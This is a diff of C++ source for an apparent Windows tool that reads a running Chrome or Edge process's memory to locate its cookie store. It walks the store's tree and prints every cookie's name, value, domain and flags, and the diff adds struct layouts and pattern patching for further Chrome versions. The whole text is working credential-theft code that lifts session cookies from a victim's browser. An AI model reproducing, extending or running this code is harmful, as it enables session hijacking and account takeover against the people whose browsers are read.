@@ -1,11 +1,11 @@
 #include <Windows.h>
-#include <stdio.h>
-
-#include "Helper.h"
 #include <string>
 #include <map>
 #include <memory>
 #include <vector>
+
+#include "Helper.h"
+#include "Memory.h"
 
 struct OptimizedString {
     char buf[23];
@@ -106,6 +106,40 @@ struct CanonicalCookieEdge {
 };
 #pragma endregion
 
+#pragma region OldVersions
+struct CanonicalCookieOld {
+    OptimizedString name;
+    OptimizedString value;
+    OptimizedString domain;
+    OptimizedString path;
+    int64_t creation_date;
+    int64_t expiry_date;
+    int64_t last_access_date;
+    int64_t last_update_date;
+};
+
+struct CanonicalCookie124 {
+    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
+    OptimizedString name;
+    OptimizedString domain;
+    OptimizedString path;
+    int64_t creation_date;
+    bool secure;
+    bool httponly;
+    CookieSameSite same_site;
+    BYTE partition_key[120];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
+    CookieSourceScheme source_scheme;
+    int source_port;    //Not implemented //End of Net::CookieBase
+    OptimizedString value;
+    int64_t expiry_date;
+    int64_t last_access_date;
+    int64_t last_update_date;
+    CookiePriority priority;       //Not implemented
+    CookieSourceType source_type;    //Not implemented
+};
+#pragma endregion
+
+
 struct Node {
     uintptr_t left;
     uintptr_t right;
@@ -125,7 +159,6 @@ struct RootNode {
 //Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
 //Or if it is stored in another address
 void ReadString(HANDLE hProcess, OptimizedString string) {
-
     if (string.len > 23)
     {
         RemoteString longString = { 0 };
@@ -133,20 +166,20 @@ void ReadString(HANDLE hProcess, OptimizedString string) {
 
         if (longString.dataAddress != 0) {
 #ifdef _DEBUG
-            printf("Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
+            PRINT("Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
 #endif
             unsigned char* buf = (unsigned char*)malloc(longString.strMax);
-            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen+1, nullptr)) {
-                DebugPrintErrorWithMessage(TEXT("Failed to read cookie value"));
+            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
+                DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read cookie value"));
                 free(buf);
                 return;
             }
-            printf("%s\n", buf);
+            PRINT("%s\n", buf);
             free(buf);
         }
     }
     else
-        printf("%s\n", string.buf);
+        PRINT("%s\n", string.buf);
 
 }
 
@@ -160,60 +193,104 @@ void PrintTimeStamp(int64_t timeStamp) {
     SYSTEMTIME systemTime;
     FileTimeToSystemTime(&fileTime, &systemTime);
 
-    printf("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
+    PRINT("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
         systemTime.wYear, systemTime.wMonth, systemTime.wDay,
         systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
 }
 
 void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess) {
-    printf("    Name: ");
+    PRINT("    Name: ");
     ReadString(hProcess, cookie.name);
-    printf("    Value: ");
+    PRINT("    Value: ");
     ReadString(hProcess, cookie.value);
-    printf("    Domain: ");
+    PRINT("    Domain: ");
     ReadString(hProcess, cookie.domain);
-    printf("    Path: ");
+    PRINT("    Path: ");
     ReadString(hProcess, cookie.path);
-    printf("    Creation time: ");
+    PRINT("    Creation time: ");
     PrintTimeStamp(cookie.creation_date);
-    printf("    Expiration time: ");
+    PRINT("    Expiration time: ");
     PrintTimeStamp(cookie.expiry_date);
-    printf("    Last accessed: ");
+    PRINT("    Last accessed: ");
     PrintTimeStamp(cookie.last_access_date);
-    printf("    Last updated: ");
+    PRINT("    Last updated: ");
     PrintTimeStamp(cookie.last_update_date);
-    printf("    Secure: %s\n", cookie.secure ? "True" : "False");
-    printf("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    printf("\n");
+    PRINT("\n");
 }
 
 void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess) {
-    printf("    Name: ");
+    PRINT("    Name: ");
     ReadString(hProcess, cookie.name);
-    printf("    Value: ");
+    PRINT("    Value: ");
     ReadString(hProcess, cookie.value);
-    printf("    Domain: ");
+    PRINT("    Domain: ");
     ReadString(hProcess, cookie.domain);
-    printf("    Path: ");
+    PRINT("    Path: ");
     ReadString(hProcess, cookie.path);
-    printf("    Creation time: ");
+    PRINT("    Creation time: ");
     PrintTimeStamp(cookie.creation_date);
-    printf("    Expiration time: ");
+    PRINT("    Expiration time: ");
     PrintTimeStamp(cookie.expiry_date);
-    printf("    Last accessed: ");
+    PRINT("    Last accessed: ");
     PrintTimeStamp(cookie.last_access_date);
-    printf("    Last updated: ");
+    PRINT("    Last updated: ");
     PrintTimeStamp(cookie.last_update_date);
-    printf("    Secure: %s\n", cookie.secure ? "True" : "False");
-    printf("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    printf("\n");
+    PRINT("\n");
 }
 
-void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, bool isChrome) {
+void PrintValuesChrome(CanonicalCookie124 cookie, HANDLE hProcess) {
+    PRINT("    Name: ");
+    ReadString(hProcess, cookie.name);
+    PRINT("    Value: ");
+    ReadString(hProcess, cookie.value);
+    PRINT("    Domain: ");
+    ReadString(hProcess, cookie.domain);
+    PRINT("    Path: ");
+    ReadString(hProcess, cookie.path);
+    PRINT("    Creation time: ");
+    PrintTimeStamp(cookie.creation_date);
+    PRINT("    Expiration time: ");
+    PrintTimeStamp(cookie.expiry_date);
+    PRINT("    Last accessed: ");
+    PrintTimeStamp(cookie.last_access_date);
+    PRINT("    Last updated: ");
+    PrintTimeStamp(cookie.last_update_date);
+    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    if (isChrome) {
+    PRINT("\n");
+}
+
+void PrintValuesOld(CanonicalCookieOld cookie, HANDLE hProcess) {
+    PRINT("    Name: ");
+    ReadString(hProcess, cookie.name);
+    PRINT("    Value: ");
+    ReadString(hProcess, cookie.value);
+    PRINT("    Domain: ");
+    ReadString(hProcess, cookie.domain);
+    PRINT("    Path: ");
+    ReadString(hProcess, cookie.path);
+    PRINT("    Creation time: ");
+    PrintTimeStamp(cookie.creation_date);
+    PRINT("    Expiration time: ");
+    PrintTimeStamp(cookie.expiry_date);
+    PRINT("    Last accessed: ");
+    PrintTimeStamp(cookie.last_access_date);
+    PRINT("    Last updated: ");
+    PrintTimeStamp(cookie.last_update_date);
+
+    PRINT("\n");
+}
+
+void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion targetConfig) {
+
+    if (targetConfig == Chrome) {
         CanonicalCookieChrome cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
             PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
@@ -221,7 +298,8 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, bool isChrome) {
         }
         PrintValuesChrome(cookie, hProcess);
 
-    } else {
+    }
+    else if (targetConfig == Edge) {
         CanonicalCookieEdge cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
             PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
@@ -229,23 +307,43 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, bool isChrome) {
         }
         PrintValuesEdge(cookie, hProcess);
     }
+    else if (targetConfig == OldChrome) {
+        CanonicalCookieOld cookie = { 0 };
+        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieOld), nullptr)) {
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            return;
+        }
+        PrintValuesOld(cookie, hProcess);
+    }
+    else if (targetConfig == Chrome124) {
+        CanonicalCookie124 cookie = { 0 };
+        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie124), nullptr)) {
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            return;
+        }
+        PrintValuesChrome(cookie, hProcess);
+    }
+    else {
+        PRINT("[-] Could not read cookie values: Unknown configuration %d", targetConfig);
+    }
+
 }
 
-void ProcessNode(HANDLE hProcess, const Node& node, bool isChrome) {
+void ProcessNode(HANDLE hProcess, const Node& node, TargetVersion targetConfig) {
     // Process the current node
-    printf("Cookie Key: ");
+    PRINT("Cookie Key: ");
     ReadString(hProcess, node.key);
 
 #ifdef _DEBUG
-    printf("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
+    PRINT("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
-    ProcessNodeValue(hProcess, node.valueAddress, isChrome);
+    ProcessNodeValue(hProcess, node.valueAddress, targetConfig);
 
     // Process the left child if it exists
     if (node.left != 0) {
         Node leftNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, leftNode, isChrome);
+            ProcessNode(hProcess, leftNode, targetConfig);
         else
             PrintErrorWithMessage(TEXT("Error reading left node"));
     }
@@ -254,13 +352,13 @@ void ProcessNode(HANDLE hProcess, const Node& node, bool isChrome) {
     if (node.right != 0) {
         Node rightNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, rightNode, isChrome);
+            ProcessNode(hProcess, rightNode, targetConfig);
         else
             PrintErrorWithMessage(TEXT("Error reading right node"));
     }
 }
 
-void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, bool isChrome) {
+void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, TargetVersion targetConfig) {
 
     RootNode cookieMap;
     if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
@@ -270,23 +368,23 @@ void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, bool isChrome) {
 
     // Process the root node
 #ifdef _DEBUG
-    printf("Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
-    printf("Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
-    printf("Size of the cookie map: %zu\n", cookieMap.size);
+    PRINT("Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
+    PRINT("Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
+    PRINT("Size of the cookie map: %zu\n", cookieMap.size);
 #endif // _DEBUG
 
-    printf("[*] Number of available cookies: %zu\n", cookieMap.size);
+    PRINT("[*] Number of available cookies: %zu\n", cookieMap.size);
 
-    if (cookieMap.firstNode == 0) //CookieMap was empty
+    if (cookieMap.firstNode == 0 || cookieMap.size == 0) //CookieMap was empty
     {
-        printf("[*] This Cookie map was empty\n");
+        PRINT("[*] This Cookie map was empty\n");
         return;
     }
 
     // Process the first node in the binary search tree
     Node firstNode;
     if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
-        ProcessNode(hProcess, firstNode, isChrome);
+        ProcessNode(hProcess, firstNode, targetConfig);
     else
         PrintErrorWithMessage(TEXT("Error reading first node\n"));
 }
@@ -304,6 +402,37 @@ BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
     return TRUE;
 }
 
+void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
+    size_t szAddr = sizeof(uintptr_t) - 1;
+    for (offset -= 1; szAddr > 3; offset--) {
+        pattern[offset] = baseAddrPattern[szAddr];
+        szAddr--;
+    }
+}
+
+BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {
+
+    //Copy the pattern
+    BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
+    for (size_t i = 0; i < patternSize; i++)
+        newPattern[i] = pattern[i];
+
+    BYTE baseAddrPattern[sizeof(uintptr_t)];
+    ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));
+
+    PatchPattern(newPattern, baseAddrPattern, 16);
+    PatchPattern(newPattern, baseAddrPattern, 24);
+    PatchPattern(newPattern, baseAddrPattern, 56);
+    //PatchPattern(newPattern, baseAddrPattern, 64);
+    PatchPattern(newPattern, baseAddrPattern, 80);
+    PatchPattern(newPattern, baseAddrPattern, 136);
+    PatchPattern(newPattern, baseAddrPattern, 168);
+    PatchPattern(newPattern, baseAddrPattern, 176);
+    PatchPattern(newPattern, baseAddrPattern, 184);
+
+    return newPattern;
+}
+
 BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {
 
     SYSTEM_INFO systemInfo;
@@ -316,9 +445,11 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
 
     while (startAddress < endAddress) {
         if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
-            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE)) != 0) {
+            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
                 BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                 SIZE_T bytesRead;
+
+                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));
 
                 //Error code 299
                 //Only part of a ReadProcessMemory or WriteProcessMemory request was completed. 
@@ -326,15 +457,20 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
                 //if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead) || GetLastError() == 299) {
                 if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                     for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
-                        if (memcmp(buffer + i, pattern, patternSize) == 0) {
+                        if (MyMemCmp(buffer + i, newPattern, patternSize)) {
                             uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                             uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
 #ifdef _DEBUG
-                            printf("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
+                            PRINT("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                 memoryInfo.AllocationBase,
                                 memoryInfo.BaseAddress,
                                 offset);
 #endif
+                            if (szCookieMonster >= 1000) {
+                                free(newPattern);
+                                return TRUE;
+                            }
+
                             cookieMonsterInstances[szCookieMonster] = resultAddress;
                             szCookieMonster++;
                         }
@@ -342,16 +478,16 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
                 }
                 else {
                     //This happens quite a lot, will not print these errors on release build
-                    DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
+                    //DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                 }
-
+                free(newPattern);
                 delete[] buffer;
             }
 
             startAddress += memoryInfo.RegionSize;
         }
         else {
-            DebugPrintErrorWithMessage(TEXT("VirtualQueryEx failed\n"));
+            DEBUG_PRINT_ERROR_MESSAGE(TEXT("VirtualQueryEx failed\n"));
             break;  // VirtualQueryEx failed
         }
     }
@@ -360,26 +496,26 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
     return FALSE;
 }
 
-BOOL FindDllPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t moduleAddr, DWORD moduleSize, uintptr_t& resultAddress)
-{
-    BYTE* buffer = new BYTE[moduleSize];
-    SIZE_T bytesRead;
+BOOL FindLargestSection(HANDLE hProcess, uintptr_t moduleAddr, uintptr_t& resultAddress) {
 
-    BOOL result = ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(moduleAddr), buffer, moduleSize, &bytesRead);
-    DWORD error = GetLastError();
+    MEMORY_BASIC_INFORMATION memoryInfo;
+    uintptr_t offset = moduleAddr;
 
-    if (result || error == 299) { //It is fine if not all was read
-        for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
-            if (MyMemCmp(buffer + i, pattern, patternSize)) {
-                    resultAddress = moduleAddr + i;
-                    delete[] buffer;
-                    return TRUE;
+    SIZE_T largestRegion = 0;
+
+    while (VirtualQueryEx(hProcess, reinterpret_cast<LPVOID>(offset), &memoryInfo, sizeof(memoryInfo)))
+    {
+        if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READONLY) != 0 && memoryInfo.Type == MEM_IMAGE)
+        {
+            if (memoryInfo.RegionSize > largestRegion) {
+                largestRegion = memoryInfo.RegionSize;
+                resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
             }
         }
+        offset += memoryInfo.RegionSize;
     }
-    else {
-        //This happens quite a lot, will not print these errors on release build
-        DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
-    }
+    if (largestRegion > 0)
+        return TRUE;
+
     return FALSE;
 }
